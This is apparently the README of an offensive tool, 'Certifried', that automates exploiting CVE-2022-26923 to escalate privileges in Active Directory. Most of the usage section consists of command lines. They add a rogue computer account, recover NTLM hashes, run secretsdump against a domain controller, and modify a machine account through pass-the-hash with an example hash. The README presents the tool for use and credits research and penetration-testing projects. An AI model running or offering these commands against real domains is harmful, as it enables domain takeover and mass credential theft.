# Certifried 

## Why Certifried?
Certifried makes steps easier to replicate to abuse the new CVE-2022-26923. However below is the manual steps to replicate the vulnerability. Detailed article can be read [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) from the original author.

## Usage
* Just add computer and update neccessary attributes
```
python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10
```
Next step is to request certificate manually, you can refer [here](https://github.com/aniqfakhrul/archives#certifried)
* Recover NTLM hash
```
python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-ldap
```
* Proceed with secretsdump
```
python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -computer-name 'ControlledComputer' -computer-pass 'Password123' -use-ldap -dump
```
_Note: If you received an error of Name Service not found, you might wanna add target ip to /etc/hosts_

### In case where you obtain a machine account hash
_CAVEAT: that this will modify the `servicePrincipalName` and `dnsHostName` attribute of the current computer account_
```
python3 modify_ourself.py range.net/ws01\$@192.168.86.182 -hashes :0e3ae07798e1bc9e02b049a795a7e69f
```

## Credits 
* https://github.com/dirkjanm/PKINITtools
* https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
* https://github.com/eloypgz/certi
* https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
